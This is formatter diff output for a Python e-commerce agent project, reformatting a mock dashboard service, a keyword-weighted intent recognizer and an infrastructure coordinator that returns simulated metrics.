             "created_at": datetime.now(timezone.utc).isoformat(),
             "updated_at": datetime.now(timezone.utc).isoformat(),
         }
-        
+
         logger.info(f"Created dashboard: {dashboard_id}")
         return created_dashboard
 
     async def get_dashboard(self, dashboard_id: str) -> Optional[Dict[str, Any]]:
         """Get a dashboard by ID.
@@ -109,11 +112,11 @@
                 "user_id": "test_user",
                 "is_public": True,
                 "created_at": datetime.now(timezone.utc).isoformat(),
                 "updated_at": datetime.now(timezone.utc).isoformat(),
             }
-        
+
         logger.debug(f"Dashboard not found: {dashboard_id}")
         return None
 
     async def get_dashboards_by_user(self, user_id: str) -> List[Dict[str, Any]]:
         """Get dashboards by user ID.
@@ -197,11 +200,11 @@
         if existing:
             existing.update(dashboard_data)
             existing["updated_at"] = datetime.now(timezone.utc).isoformat()
             logger.info(f"Updated dashboard: {dashboard_id}")
             return existing
-        
+
         return None
 
     async def delete_dashboard(self, dashboard_id: str) -> bool:
         """Delete a dashboard.
 
@@ -217,11 +220,11 @@
         # Mock deletion - always return True for existing dashboards
         existing = await self.get_dashboard(dashboard_id)
         if existing:
             logger.info(f"Deleted dashboard: {dashboard_id}")
             return True
-        
+
         return False
 
     async def get_dashboard_stats(self) -> Dict[str, Any]:
         """Get dashboard statistics.
 
@@ -240,11 +243,11 @@
         }
 
     async def shutdown(self) -> None:
         """Shutdown the service."""
         try:
-            if self.database and hasattr(self.database, 'close'):
+            if self.database and hasattr(self.database, "close"):
                 await self.database.close()
             logger.info("Dashboard service shutdown successfully")
         except Exception as e:
             logger.error(f"Error shutting down dashboard service: {e}")
         finally:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/dashboard/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/metrics_service.py	2025-06-14 20:35:30.831831+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/metrics_service.py	2025-06-19 04:04:06.449557+00:00
@@ -7,12 +7,19 @@
 from typing import TYPE_CHECKING, Any, Dict, List, Optional, Union, cast
 
 from pydantic import BaseModel, ConfigDict
 
 from fs_agt_clean.core.config.manager import ConfigManager
+
 # from fs_agt_clean.core.monitoring.alerts.manager import AlertManager  # Temporarily disabled
-from fs_agt_clean.core.monitoring.common_types import MetricDataPoint, MetricType, MetricCategory, MetricUpdate
+from fs_agt_clean.core.monitoring.common_types import (
+    MetricDataPoint,
+    MetricType,
+    MetricCategory,
+    MetricUpdate,
+)
+
 # from fs_agt_clean.core.monitoring.log_manager import LogManager  # Temporarily disabled
 # from fs_agt_clean.core.monitoring.metrics_models import MetricUpdate  # Temporarily disabled
 # from fs_agt_clean.core.monitoring.types import (  # Temporarily disabled
 #     MetricCategory,
 #     MetricsServiceProtocol,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/metrics_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/communication/intent_recognizer.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/communication/intent_recognizer.py	2025-06-19 04:04:06.479721+00:00
@@ -18,110 +18,276 @@
 
 # Enhanced intent patterns with weighted keywords and phrases
 INTENT_PATTERNS = {
     "market_query": {
         "high_weight": [
-            "pricing analysis", "price comparison", "competitor pricing", "market price",
-            "amazon price", "ebay price", "pricing strategy", "inventory management",
-            "stock levels", "asin", "sku", "marketplace optimization", "profit margin",
-            "pricing for", "cost analysis", "revenue optimization"
+            "pricing analysis",
+            "price comparison",
+            "competitor pricing",
+            "market price",
+            "amazon price",
+            "ebay price",
+            "pricing strategy",
+            "inventory management",
+            "stock levels",
+            "asin",
+            "sku",
+            "marketplace optimization",
+            "profit margin",
+            "pricing for",
+            "cost analysis",
+            "revenue optimization",
         ],
         "medium_weight": [
-            "price", "pricing", "inventory", "stock", "amazon", "ebay", "marketplace",
-            "competitor", "market", "sell", "buy", "product", "cost", "profit",
-            "margin", "revenue", "sales", "competition", "demand", "supply"
-        ],
-        "low_weight": [
-            "listing", "trend", "forecast", "optimization"
-        ]
+            "price",
+            "pricing",
+            "inventory",
+            "stock",
+            "amazon",
+            "ebay",
+            "marketplace",
+            "competitor",
+            "market",
+            "sell",
+            "buy",
+            "product",
+            "cost",
+            "profit",
+            "margin",
+            "revenue",
+            "sales",
+            "competition",
+            "demand",
+            "supply",
+        ],
+        "low_weight": ["listing", "trend", "forecast", "optimization"],
     },
     "analytics_query": {
         "high_weight": [
-            "sales report", "performance report", "analytics dashboard", "conversion rate",
-            "performance metrics", "data analysis", "kpi tracking", "roi analysis",
-            "traffic analysis", "sales data", "performance data", "business intelligence"
+            "sales report",
+            "performance report",
+            "analytics dashboard",
+            "conversion rate",
+            "performance metrics",
+            "data analysis",
+            "kpi tracking",
+            "roi analysis",
+            "traffic analysis",
+            "sales data",
+            "performance data",
+            "business intelligence",
         ],
         "medium_weight": [
-            "report", "analytics", "performance", "metrics", "data", "dashboard",
-            "chart", "graph", "statistics", "analysis", "kpi", "roi", "conversion",
-            "traffic", "views", "clicks", "impressions", "ctr"
+            "report",
+            "analytics",
+            "performance",
+            "metrics",
+            "data",
+            "dashboard",
+            "chart",
+            "graph",
+            "statistics",
+            "analysis",
+            "kpi",
+            "roi",
+            "conversion",
+            "traffic",
+            "views",
+            "clicks",
+            "impressions",
+            "ctr",
         ],
         "low_weight": [
-            "growth", "decline", "trend", "benchmark", "revenue", "profit", "loss"
-        ]
+            "growth",
+            "decline",
+            "trend",
+            "benchmark",
+            "revenue",
+            "profit",
+            "loss",
+        ],
     },
     "logistics_query": {
         "high_weight": [
-            "track shipment", "shipping status", "delivery tracking", "fba shipment",
-            "warehouse management", "fulfillment center", "shipping cost", "delivery time",
-            "package tracking", "shipment arrival", "logistics optimization"
+            "track shipment",
+            "shipping status",
+            "delivery tracking",
+            "fba shipment",
+            "warehouse management",
+            "fulfillment center",
+            "shipping cost",
+            "delivery time",
+            "package tracking",
+            "shipment arrival",
+            "logistics optimization",
         ],
         "medium_weight": [
-            "shipping", "delivery", "warehouse", "fulfillment", "logistics",
-            "tracking", "carrier", "transport", "freight", "ups", "fedex",
-            "usps", "dhl", "package", "shipment", "dispatch", "arrival"
-        ],
-        "low_weight": [
-            "transit", "customs", "duty", "tax", "import", "export"
-        ]
+            "shipping",
+            "delivery",
+            "warehouse",
+            "fulfillment",
+            "logistics",
+            "tracking",
+            "carrier",
+            "transport",
+            "freight",
+            "ups",
+            "fedex",
+            "usps",
+            "dhl",
+            "package",
+            "shipment",
+            "dispatch",
+            "arrival",
+        ],
+        "low_weight": ["transit", "customs", "duty", "tax", "import", "export"],
     },
     "content_query": {
         "high_weight": [
-            "product description", "listing optimization", "seo optimization", "content creation",
-            "product title", "keyword optimization", "listing content", "product copy",
-            "optimize listing", "improve description", "content strategy"
+            "product description",
+            "listing optimization",
+            "seo optimization",
+            "content creation",
+            "product title",
+            "keyword optimization",
+            "listing content",
+            "product copy",
+            "optimize listing",
+            "improve description",
+            "content strategy",
         ],
         "medium_weight": [
-            "description", "title", "content", "copy", "write", "create", "optimize",
-            "seo", "keyword", "tag", "category", "brand", "feature", "benefit",
-            "specification", "review", "rating", "feedback"
+            "description",
+            "title",
+            "content",
+            "copy",
+            "write",
+            "create",
+            "optimize",
+            "seo",
+            "keyword",
+            "tag",
+            "category",
+            "brand",
+            "feature",
+            "benefit",
+            "specification",
+            "review",
+            "rating",
+            "feedback",
         ],
         "low_weight": [
-            "image", "photo", "testimonial", "bullet", "headline", "caption", "alt text", "meta"
-        ]
+            "image",
+            "photo",
+            "testimonial",
+            "bullet",
+            "headline",
+            "caption",
+            "alt text",
+            "meta",
+        ],
     },
     "executive_query": {
         "high_weight": [
-            "business strategy", "growth strategy", "strategic planning", "business plan",
-            "investment strategy", "business growth", "strategic decision", "business advice",
-            "growth planning", "business direction", "strategic guidance"
+            "business strategy",
+            "growth strategy",
+            "strategic planning",
+            "business plan",
+            "investment strategy",
+            "business growth",
+            "strategic decision",
+            "business advice",
+            "growth planning",
+            "business direction",
+            "strategic guidance",
         ],
         "medium_weight": [
-            "strategy", "decision", "plan", "planning", "business", "growth",
-            "recommendation", "advice", "guidance", "direction", "goal", "objective",
-            "target", "milestone", "roadmap", "vision", "mission", "expansion"
+            "strategy",
+            "decision",
+            "plan",
+            "planning",
+            "business",
+            "growth",
+            "recommendation",
+            "advice",
+            "guidance",
+            "direction",
+            "goal",
+            "objective",
+            "target",
+            "milestone",
+            "roadmap",
+            "vision",
+            "mission",
+            "expansion",
         ],
         "low_weight": [
-            "budget", "roi", "investment", "risk", "opportunity", "threat", "swot", "competitive"
-        ]
+            "budget",
+            "roi",
+            "investment",
+            "risk",
+            "opportunity",
+            "threat",
+            "swot",
+            "competitive",
+        ],
     },
     "general_query": {
         "high_weight": [
-            "hello", "hi", "help me", "can you help", "how do i", "what is",
-            "thank you", "thanks", "goodbye", "bye"
+            "hello",
+            "hi",
+            "help me",
+            "can you help",
+            "how do i",
+            "what is",
+            "thank you",
+            "thanks",
+            "goodbye",
+            "bye",
         ],
         "medium_weight": [
-            "help", "how", "what", "when", "where", "why", "who", "can", "could",
-            "would", "should", "please", "explain", "show", "tell"
-        ],
-        "low_weight": []
-    }
+            "help",
+            "how",
+            "what",
+            "when",
+            "where",
+            "why",
+            "who",
+            "can",
+            "could",
+            "would",
+            "should",
+            "please",
+            "explain",
+            "show",
+            "tell",
+        ],
+        "low_weight": [],
+    },
 }
 
 # Context keywords that modify intent confidence
 CONTEXT_MODIFIERS = {
     "urgency": ["urgent", "asap", "immediately", "quickly", "fast", "rush"],
     "uncertainty": ["maybe", "perhaps", "possibly", "might", "could be", "not sure"],
     "comparison": ["vs", "versus", "compare", "better", "worse", "best", "worst"],
-    "temporal": ["today", "tomorrow", "yesterday", "this week", "next month", "quarterly"],
-    "quantitative": ["how much", "how many", "percentage", "rate", "ratio", "number"]
+    "temporal": [
+        "today",
+        "tomorrow",
+        "yesterday",
+        "this week",
+        "next month",
+        "quarterly",
+    ],
+    "quantitative": ["how much", "how many", "percentage", "rate", "ratio", "number"],
 }
 
 
 @dataclass
 class IntentResult:
     """Result of intent recognition analysis."""
+
     primary_intent: str
     confidence: float
     secondary_intents: List[Tuple[str, float]]
     context_modifiers: List[str]
     extracted_entities: Dict[str, Any]
@@ -130,154 +296,158 @@
     suggested_agent: Optional[str] = None
 
 
 class IntentRecognizer:
     """Advanced intent recognition system with rule-based and contextual analysis."""
-    
+
     def __init__(self):
         """Initialize the intent recognizer."""
         self.intent_patterns = INTENT_PATTERNS
         self.context_modifiers = CONTEXT_MODIFIERS
-        
+
         # Compile regex patterns for efficiency with weights
         self.compiled_patterns = {}
         for intent, weight_groups in self.intent_patterns.items():
             self.compiled_patterns[intent] = {}
             for weight, keywords in weight_groups.items():
                 if keywords:  # Only compile if keywords exist
-                    pattern = r'\b(?:' + '|'.join(re.escape(kw) for kw in keywords) + r')\b'
-                    self.compiled_patterns[intent][weight] = re.compile(pattern, re.IGNORECASE)
-        
+                    pattern = (
+                        r"\b(?:" + "|".join(re.escape(kw) for kw in keywords) + r")\b"
+                    )
+                    self.compiled_patterns[intent][weight] = re.compile(
+                        pattern, re.IGNORECASE
+                    )
+
         # Track conversation context for better intent detection
         self.conversation_context = defaultdict(list)
-        
+
         # Intent confidence thresholds
-        self.confidence_thresholds = {
-            "high": 0.8,
-            "medium": 0.5,
-            "low": 0.3
-        }
-    
+        self.confidence_thresholds = {"high": 0.8, "medium": 0.5, "low": 0.3}
+
     def recognize_intent(
         self,
         message: str,
         user_id: Optional[str] = None,
         conversation_id: Optional[str] = None,
-        conversation_history: Optional[List[Dict]] = None
+        conversation_history: Optional[List[Dict]] = None,
     ) -> IntentResult:
         """
         Recognize intent from user message with contextual analysis.
-        
+
         Args:
             message: User message text
             user_id: Optional user identifier
             conversation_id: Optional conversation identifier
             conversation_history: Optional conversation history for context
-            
+
         Returns:
             IntentResult with primary intent and analysis
         """
         try:
             # Preprocess message
             processed_message = self._preprocess_message(message)
-            
+
             # Calculate intent scores using multiple methods
             rule_based_scores = self._calculate_rule_based_scores(processed_message)
             context_scores = self._calculate_context_scores(
                 processed_message, conversation_history
             )
-            
+
             # Combine scores with weights
             combined_scores = self._combine_scores(rule_based_scores, context_scores)
-            
+
             # Determine primary intent
-            primary_intent, primary_confidence = self._get_primary_intent(combined_scores)
-            
+            primary_intent, primary_confidence = self._get_primary_intent(
+                combined_scores
+            )
+
             # Get secondary intents
-            secondary_intents = self._get_secondary_intents(combined_scores, primary_intent)
-            
+            secondary_intents = self._get_secondary_intents(
+                combined_scores, primary_intent
+            )
+
             # Extract context modifiers
             context_modifiers = self._extract_context_modifiers(processed_message)
-            
+
             # Extract entities
             entities = self._extract_entities(processed_message, primary_intent)
-            
+
             # Generate reasoning
             reasoning = self._generate_reasoning(
                 primary_intent, primary_confidence, rule_based_scores, context_modifiers
             )
-            
+
             # Determine if handoff is needed
             requires_handoff = self._requires_agent_handoff(
                 primary_intent, primary_confidence, conversation_history
             )
-            
+
             # Suggest appropriate agent
             suggested_agent = self._suggest_agent(primary_intent, entities)
-            
+
             # Update conversation context
             if conversation_id:
                 self._update_conversation_context(
                     conversation_id, message, primary_intent, entities
                 )
-            
+
             return IntentResult(
                 primary_intent=primary_intent,
                 confidence=primary_confidence,
                 secondary_intents=secondary_intents,
                 context_modifiers=context_modifiers,
                 extracted_entities=entities,
                 reasoning=reasoning,
                 requires_handoff=requires_handoff,
-                suggested_agent=suggested_agent
+                suggested_agent=suggested_agent,
             )
-            
+
         except Exception as e:
             logger.error(f"Error in intent recognition: {e}")
             return IntentResult(
                 primary_intent="general_query",
                 confidence=0.1,
                 secondary_intents=[],
                 context_modifiers=[],
                 extracted_entities={},
                 reasoning=f"Error in intent recognition: {e}",
                 requires_handoff=False,
-                suggested_agent="assistant"
+                suggested_agent="assistant",
             )
-    
+
     def _preprocess_message(self, message: str) -> str:
         """Preprocess message for better pattern matching."""
         # Convert to lowercase for pattern matching
         processed = message.lower().strip()
-        
+
         # Remove extra whitespace
-        processed = re.sub(r'\s+', ' ', processed)
-        
+        processed = re.sub(r"\s+", " ", processed)
+
         # Handle common abbreviations
         abbreviations = {
             "roi": "return on investment",
             "seo": "search engine optimization",
             "ctr": "click through rate",
             "kpi": "key performance indicator",
             "asin": "amazon standard identification number",
-            "sku": "stock keeping unit"
+            "sku": "stock keeping unit",
         }
-        
+
         for abbr, full in abbreviations.items():
-            processed = re.sub(r'\b' + abbr + r'\b', full, processed)
-        
+            processed = re.sub(r"\b" + abbr + r"\b", full, processed)
+
         return processed
-    
+
     def _calculate_rule_based_scores(self, message: str) -> Dict[str, float]:
         """Calculate intent scores based on weighted keyword pattern matching."""
         scores = {}
 
         # Weight multipliers for different keyword categories
         weight_multipliers = {
             "high_weight": 3.0,
             "medium_weight": 1.5,
-            "low_weight": 1.0
+            "low_weight": 1.0,
         }
 
         for intent, weight_patterns in self.compiled_patterns.items():
             total_score = 0.0
             total_matches = 0
@@ -295,11 +465,13 @@
                     total_matches += match_count
 
             if total_score > 0:
                 # Normalize by message length but cap the penalty
                 message_length = len(message.split())
-                length_factor = min(message_length / 10.0, 1.0)  # Don't over-penalize long messages
+                length_factor = min(
+                    message_length / 10.0, 1.0
+                )  # Don't over-penalize long messages
 
                 # Apply length normalization
                 normalized_score = total_score / max(length_factor, 0.5)
 
                 # Boost for multiple matches across different weight categories
@@ -309,24 +481,26 @@
                 scores[intent] = min(normalized_score, 1.0)
             else:
                 scores[intent] = 0.0
 
         return scores
-    
+
     def _calculate_context_scores(
-        self, 
-        message: str, 
-        conversation_history: Optional[List[Dict]]
+        self, message: str, conversation_history: Optional[List[Dict]]
     ) -> Dict[str, float]:
         """Calculate intent scores based on conversation context."""
         context_scores = defaultdict(float)
-        
+
         if not conversation_history:
             return dict(context_scores)
-        
+
         # Analyze recent messages for context
-        recent_messages = conversation_history[-5:] if len(conversation_history) > 5 else conversation_history
+        recent_messages = (
+            conversation_history[-5:]
+            if len(conversation_history) > 5
+            else conversation_history
+        )
 
         for msg in recent_messages:
             msg_content = msg.get("content", "").lower()
 
             # Look for intent patterns in recent context
@@ -335,228 +509,230 @@
                     if pattern.search(msg_content):
                         # Give more weight to high-weight pattern matches in context
                         weight_boost = 0.15 if weight == "high_weight" else 0.1
                         context_scores[intent] += weight_boost
                         break  # Don't double-count for same intent
-        
+
         # Normalize context scores
         max_context_score = max(context_scores.values()) if context_scores else 1.0
         if max_context_score > 0:
             for intent in context_scores:
-                context_scores[intent] = min(context_scores[intent] / max_context_score, 0.3)
-        
+                context_scores[intent] = min(
+                    context_scores[intent] / max_context_score, 0.3
+                )
+
         return dict(context_scores)
-    
+
     def _combine_scores(
-        self, 
-        rule_scores: Dict[str, float], 
-        context_scores: Dict[str, float]
+        self, rule_scores: Dict[str, float], context_scores: Dict[str, float]
     ) -> Dict[str, float]:
         """Combine rule-based and context scores with appropriate weights."""
         combined = {}
-        
+
         # Weight: 70% rule-based, 30% context
         rule_weight = 0.7
         context_weight = 0.3
-        
+
         all_intents = set(rule_scores.keys()) | set(context_scores.keys())
-        
+
         for intent in all_intents:
             rule_score = rule_scores.get(intent, 0.0)
             context_score = context_scores.get(intent, 0.0)
-            
-            combined[intent] = (rule_score * rule_weight) + (context_score * context_weight)
-        
+
+            combined[intent] = (rule_score * rule_weight) + (
+                context_score * context_weight
+            )
+
         return combined
-    
+
     def _get_primary_intent(self, scores: Dict[str, float]) -> Tuple[str, float]:
         """Determine the primary intent from combined scores."""
         if not scores:
             return "general_query", 0.1
-        
+
         # Get intent with highest score
         primary_intent = max(scores, key=scores.get)
         primary_confidence = scores[primary_intent]
-        
+
         # If confidence is too low, default to general query
         if primary_confidence < self.confidence_thresholds["low"]:
             return "general_query", primary_confidence
-        
+
         return primary_intent, primary_confidence
-    
+
     def _get_secondary_intents(
-        self, 
-        scores: Dict[str, float], 
-        primary_intent: str
+        self, scores: Dict[str, float], primary_intent: str
     ) -> List[Tuple[str, float]]:
         """Get secondary intents ranked by confidence."""
         secondary = []
-        
+
         for intent, score in scores.items():
             if intent != primary_intent and score > self.confidence_thresholds["low"]:
                 secondary.append((intent, score))
-        
+
         # Sort by confidence and return top 3
         secondary.sort(key=lambda x: x[1], reverse=True)
         return secondary[:3]
-    
+
     def _extract_context_modifiers(self, message: str) -> List[str]:
         """Extract context modifiers from the message."""
         modifiers = []
-        
+
         for modifier_type, keywords in self.context_modifiers.items():
             for keyword in keywords:
                 if keyword in message:
                     modifiers.append(modifier_type)
                     break
-        
+
         return modifiers
-    
+
     def _extract_entities(self, message: str, intent: str) -> Dict[str, Any]:
         """Extract relevant entities based on intent."""
         entities = {}
-        
+
         # Extract numbers and currencies
-        numbers = re.findall(r'\b\d+(?:\.\d+)?\b', message)
+        numbers = re.findall(r"\b\d+(?:\.\d+)?\b", message)
         if numbers:
             entities["numbers"] = [float(n) for n in numbers]
-        
-        currencies = re.findall(r'\$\d+(?:\.\d+)?', message)
+
+        currencies = re.findall(r"\$\d+(?:\.\d+)?", message)
         if currencies:
             entities["currencies"] = currencies
-        
+
         # Extract dates and time references
         time_patterns = [
-            r'\b(?:today|tomorrow|yesterday)\b',
-            r'\b(?:this|next|last)\s+(?:week|month|quarter|year)\b',
-            r'\b\d{1,2}\/\d{1,2}\/\d{2,4}\b'
+            r"\b(?:today|tomorrow|yesterday)\b",
+            r"\b(?:this|next|last)\s+(?:week|month|quarter|year)\b",
+            r"\b\d{1,2}\/\d{1,2}\/\d{2,4}\b",
         ]
-        
+
         for pattern in time_patterns:
             matches = re.findall(pattern, message, re.IGNORECASE)
             if matches:
                 entities.setdefault("time_references", []).extend(matches)
-        
+
         # Intent-specific entity extraction
         if intent == "market_query":
             # Extract product identifiers
-            asin_pattern = r'\b[A-Z0-9]{10}\b'
+            asin_pattern = r"\b[A-Z0-9]{10}\b"
             asins = re.findall(asin_pattern, message)
             if asins:
                 entities["asins"] = asins
-        
+
         elif intent == "analytics_query":
             # Extract metric names
-            metric_patterns = [
-                r'\b(?:revenue|profit|sales|conversion|ctr|roi)\b'
-            ]
+            metric_patterns = [r"\b(?:revenue|profit|sales|conversion|ctr|roi)\b"]
             for pattern in metric_patterns:
                 matches = re.findall(pattern, message, re.IGNORECASE)
                 if matches:
                     entities.setdefault("metrics", []).extend(matches)
-        
+
         return entities
-    
+
     def _generate_reasoning(
         self,
         intent: str,
         confidence: float,
         scores: Dict[str, float],
-        modifiers: List[str]
+        modifiers: List[str],
     ) -> str:
         """Generate human-readable reasoning for the intent classification."""
         reasoning_parts = []
-        
+
         # Primary intent reasoning
         if confidence >= self.confidence_thresholds["high"]:
             reasoning_parts.append(f"High confidence ({confidence:.2f}) for {intent}")
         elif confidence >= self.confidence_thresholds["medium"]:
             reasoning_parts.append(f"Medium confidence ({confidence:.2f}) for {intent}")
         else:
             reasoning_parts.append(f"Low confidence ({confidence:.2f}) for {intent}")
-        
+
         # Top scoring intents
         top_intents = sorted(scores.items(), key=lambda x: x[1], reverse=True)[:3]
-        top_scores = [f"{intent}: {score:.2f}" for intent, score in top_intents if score > 0]
+        top_scores = [
+            f"{intent}: {score:.2f}" for intent, score in top_intents if score > 0
+        ]
         if top_scores:
             reasoning_parts.append(f"Top scores: {', '.join(top_scores)}")
-        
+
         # Context modifiers
         if modifiers:
             reasoning_parts.append(f"Context modifiers: {', '.join(modifiers)}")
-        
+
         return "; ".join(reasoning_parts)
-    
+
     def _requires_agent_handoff(
-        self,
-        intent: str,
-        confidence: float,
-        conversation_history: Optional[List[Dict]]
+        self, intent: str, confidence: float, conversation_history: Optional[List[Dict]]
     ) -> bool:
         """Determine if the query requires handoff to a specialized agent."""
         # High confidence specialized intents require handoff
-        specialized_intents = ["market_query", "analytics_query", "logistics_query", 
-                             "content_query", "executive_query"]
-        
-        if intent in specialized_intents and confidence >= self.confidence_thresholds["medium"]:
+        specialized_intents = [
+            "market_query",
+            "analytics_query",
+            "logistics_query",
+            "content_query",
+            "executive_query",
+        ]
+
+        if (
+            intent in specialized_intents
+            and confidence >= self.confidence_thresholds["medium"]
+        ):
             return True
-        
+
         # Check for context switches in conversation
         if conversation_history and len(conversation_history) > 0:
             last_message = conversation_history[-1]
             last_intent = last_message.get("intent")
-            
+
             if last_intent and last_intent != intent and intent in specialized_intents:
                 return True
-        
+
         return False
-    
+
     def _suggest_agent(self, intent: str, entities: Dict[str, Any]) -> str:
         """Suggest the most appropriate agent for the intent."""
         agent_mapping = {
             "market_query": "market",
-            "analytics_query": "analytics", 
+            "analytics_query": "analytics",
             "logistics_query": "logistics",
             "content_query": "content",
             "executive_query": "executive",
-            "general_query": "assistant"
+            "general_query": "assistant",
         }
-        
+
         return agent_mapping.get(intent, "assistant")
-    
+
     def _update_conversation_context(
-        self,
-        conversation_id: str,
-        message: str,
-        intent: str,
-        entities: Dict[str, Any]
+        self, conversation_id: str, message: str, intent: str, entities: Dict[str, Any]
     ):
         """Update conversation context for future intent recognition."""
         context_entry = {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "message": message,
             "intent": intent,
-            "entities": entities
+            "entities": entities,
         }
-        
+
         self.conversation_context[conversation_id].append(context_entry)
-        
+
         # Keep only last 10 entries per conversation
         if len(self.conversation_context[conversation_id]) > 10:
-            self.conversation_context[conversation_id] = \
-                self.conversation_context[conversation_id][-10:]
-    
+            self.conversation_context[conversation_id] = self.conversation_context[
+                conversation_id
+            ][-10:]
+
     def get_intent_statistics(self) -> Dict[str, Any]:
         """Get statistics about intent recognition performance."""
         total_conversations = len(self.conversation_context)
-        
+
         intent_counts = defaultdict(int)
         for conversation in self.conversation_context.values():
             for entry in conversation:
                 intent_counts[entry["intent"]] += 1
-        
+
         return {
             "total_conversations": total_conversations,
             "intent_distribution": dict(intent_counts),
             "available_intents": list(self.intent_patterns.keys()),
-            "confidence_thresholds": self.confidence_thresholds
+            "confidence_thresholds": self.confidence_thresholds,
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/communication/intent_recognizer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/__init__.py	2025-06-14 20:35:30.827822+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/__init__.py	2025-06-19 04:04:06.762259+00:00
@@ -20,22 +20,31 @@
 logger = logging.getLogger(__name__)
 
 # Import infrastructure components
 try:
     from fs_agt_clean.services.data_pipeline.pipeline import DataPipeline
-    from fs_agt_clean.services.data_pipeline.models import ProductData, TransformationResult
+    from fs_agt_clean.services.data_pipeline.models import (
+        ProductData,
+        TransformationResult,
+    )
     from fs_agt_clean.services.data_pipeline.validators import DataValidator
 except ImportError:
     DataPipeline = None
     ProductData = None
     TransformationResult = None
     DataValidator = None
 
 try:
-    from fs_agt_clean.services.infrastructure.monitoring.monitoring_service import MonitoringService
-    from fs_agt_clean.services.infrastructure.monitoring.alert_manager import AlertManager
-    from fs_agt_clean.services.infrastructure.monitoring.metrics_collector import MetricsCollector
+    from fs_agt_clean.services.infrastructure.monitoring.monitoring_service import (
+        MonitoringService,
+    )
+    from fs_agt_clean.services.infrastructure.monitoring.alert_manager import (
+        AlertManager,
+    )
+    from fs_agt_clean.services.infrastructure.monitoring.metrics_collector import (
+        MetricsCollector,
+    )
 except ImportError:
     MonitoringService = None
     AlertManager = None
     MetricsCollector = None
 
@@ -45,59 +54,59 @@
 
     def __init__(self, config: Optional[Dict[str, Any]] = None):
         """Initialize the infrastructure coordinator."""
         self.config = config or {}
         self.is_initialized = False
-        
+
         # Infrastructure services
         self.data_pipeline = None
         self.monitoring_service = None
         self.alert_manager = None
         self.metrics_collector = None
-        
+
         # Service status tracking
         self.service_status = {
             "data_pipeline": "not_initialized",
-            "monitoring": "not_initialized", 
+            "monitoring": "not_initialized",
             "alerting": "not_initialized",
-            "metrics": "not_initialized"
+            "metrics": "not_initialized",
         }
 
     async def initialize(self) -> Dict[str, Any]:
         """Initialize all infrastructure services."""
         try:
             logger.info("Initializing infrastructure coordinator")
-            
+
             # Initialize data pipeline
             await self._initialize_data_pipeline()
-            
+
             # Initialize monitoring services
             await self._initialize_monitoring()
-            
+
             # Initialize alerting
             await self._initialize_alerting()
-            
+
             # Initialize metrics collection
             await self._initialize_metrics()
-            
+
             self.is_initialized = True
             logger.info("Infrastructure coordinator initialized successfully")
-            
+
             return {
                 "status": "success",
                 "message": "Infrastructure coordinator initialized",
                 "services": self.service_status,
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error("Failed to initialize infrastructure coordinator: %s", str(e))
             return {
                 "status": "error",
                 "message": str(e),
                 "services": self.service_status,
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
     async def _initialize_data_pipeline(self) -> None:
         """Initialize data pipeline services."""
         try:
@@ -160,133 +169,135 @@
         """Get comprehensive infrastructure status."""
         try:
             return {
                 "coordinator": {
                     "initialized": self.is_initialized,
-                    "uptime": "active" if self.is_initialized else "inactive"
+                    "uptime": "active" if self.is_initialized else "inactive",
                 },
                 "services": self.service_status,
                 "data_pipeline": {
                     "status": self.service_status["data_pipeline"],
-                    "components": ["acquisition", "validation", "transformation", "storage"]
+                    "components": [
+                        "acquisition",
+                        "validation",
+                        "transformation",
+                        "storage",
+                    ],
                 },
                 "monitoring": {
                     "status": self.service_status["monitoring"],
-                    "components": ["metrics", "alerts", "dashboards", "health_checks"]
+                    "components": ["metrics", "alerts", "dashboards", "health_checks"],
                 },
                 "devops": {
                     "kubernetes": "available",
                     "deployments": "configured",
                     "networking": "configured",
-                    "security": "configured"
-                },
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                    "security": "configured",
+                },
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
         except Exception as e:
             logger.error("Failed to get infrastructure status: %s", str(e))
             return {"error": str(e)}
 
-    async def process_data_batch(self, data_batch: List[Dict[str, Any]]) -> Dict[str, Any]:
+    async def process_data_batch(
+        self, data_batch: List[Dict[str, Any]]
+    ) -> Dict[str, Any]:
         """Process a batch of data through the pipeline."""
         try:
             if self.service_status["data_pipeline"] != "active":
                 return {"error": "Data pipeline not available"}
-            
+
             # Simulate data processing
             processed_count = 0
             failed_count = 0
-            
+
             for item in data_batch:
                 try:
                     # Basic validation
                     if "asin" in item and item["asin"]:
                         processed_count += 1
                     else:
                         failed_count += 1
                 except Exception:
                     failed_count += 1
-            
+
             return {
                 "batch_size": len(data_batch),
                 "processed": processed_count,
                 "failed": failed_count,
                 "success_rate": processed_count / len(data_batch) if data_batch else 0,
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error("Failed to process data batch: %s", str(e))
             return {"error": str(e)}
 
     async def get_system_metrics(self) -> Dict[str, Any]:
         """Get system-wide metrics."""
         try:
             if self.service_status["metrics"] != "active":
                 return {"error": "Metrics collection not available"}
-            
+
             # Simulate metrics collection
             return {
                 "system": {
                     "cpu_usage": 45.2,
                     "memory_usage": 68.7,
                     "disk_usage": 34.1,
-                    "network_io": {"in": 1024, "out": 2048}
+                    "network_io": {"in": 1024, "out": 2048},
                 },
                 "application": {
                     "active_agents": 14,
                     "processed_requests": 1250,
                     "error_rate": 0.8,
-                    "response_time_avg": 150
+                    "response_time_avg": 150,
                 },
                 "infrastructure": {
                     "kubernetes_pods": 12,
                     "database_connections": 25,
                     "cache_hit_rate": 94.5,
-                    "queue_depth": 3
-                },
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-            
+                    "queue_depth": 3,
+                },
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
